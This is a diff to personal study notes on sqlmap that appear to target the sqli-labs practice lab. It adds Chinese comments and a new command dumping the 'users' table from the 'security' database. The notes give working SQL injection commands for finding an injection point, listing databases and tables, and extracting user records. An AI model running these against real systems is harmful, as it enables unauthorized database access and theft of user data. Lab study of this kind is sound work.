@@ -86,10 +86,13 @@
 ---
 **sqlmap**
 
-sqlmap -u "ip/Less-1/?id=1"  #
+sqlmap -u "ip/Less-1/?id=1"  #检测注入点
 ![[Pasted image 20260529161026.png]]
 
-sqlmap -u "ip/Less-1/?id=1" --dbs
+sqlmap -u "ip/Less-1/?id=1" --dbs  #列出所有数据表
 ![[Pasted image 20260529161331.png]]
-sqlmap -u "ip/Less-1/?id=1" -D security --tables
+sqlmap -u "ip/Less-1/?id=1" -D security --tables  #列表
 ![[Pasted image 20260529161542.png]]
+
+sqlmap -u "ip/Less-1/?id=1" -D security -T users --dump #托数据
+![[Pasted image 20260529161804.png]]
